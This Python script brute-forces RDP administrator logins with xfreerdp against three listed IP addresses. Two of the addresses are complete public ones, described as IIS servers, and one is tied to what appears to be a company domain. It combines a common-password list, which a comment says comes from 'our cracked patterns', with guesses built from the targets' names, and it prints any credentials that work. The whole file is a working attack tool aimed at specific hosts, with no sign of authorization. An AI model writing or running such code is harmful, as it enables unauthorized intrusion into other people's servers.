import subprocess, socket, threading, time

targets = [
    ('47.97.6', 'IIS 10.0 + FTP FileZilla'),
    ('118.190.207.13', 'IIS Windows'),
    ('59.110.169.32', 'IIS 7.5 cixingkeji.com'),
]

# Password list - from all our cracked patterns
passwords = [
    'admin','123456','admin123','admin888','password',
    'P@ssw0rd','Administrator','Admin123','Admin888',
    'admin@123','pass@123','12345678','123456789',
    'Admin@12345','Windows2022','Windows2019',
    'admin123456','root','Admin123456',
    '1q2w3e4r','abc123','qwerty','iloveyou',
    '5201314','admin8888','admin000',
]

# Also domain-based passwords
domain_pws = {
    '47.97.6': ['filezilla','server','xmftp','ftp123','FileZilla'],
    '118.190.207.13': ['wanzheng','wanzheng123','Wanzhengdq','wanzheng888'],
    '59.110.169.32': ['cixing','cixingkeji','Cixingkeji','cixing123','CiXing'],
}

hits = []
lock = threading.Lock()

def test_rdp(ip, desc, pw):
    try:
        r = subprocess.run(
            ['timeout', '6', 'xvfb-run', '-a', 'xfreerdp',
             '/v:' + ip, '/u:administrator', '/p:' + pw,
             '/cert-ignore', '/auth-only', '+sec-nla'],
            capture_output=True, text=True, timeout=8)
        if 'exit status 0' in r.stdout + r.stderr:
            with lock:
                print('>>> RDP HIT: ' + ip + ' (' + desc + ') administrator/' + pw + ' <<<')
                hits.append((ip, desc, pw))
            return True
    except:
        pass
    return False

print('Brute-forcing ' + str(len(targets)) + ' targets with ' + str(len(passwords)) + ' passwords each...')

for ip, desc in targets:
    all_pws = domain_pws.get(ip, []) + passwords
    print('--- ' + ip + ' (' + desc + ') ---')
    for pw in all_pws:
        if test_rdp(ip, desc, pw):
            break
    print('  done')

print('Total hits:', len(hits))
for ip, desc, pw in hits:
    print(ip + ' ' + desc + ' -> administrator/' + pw)
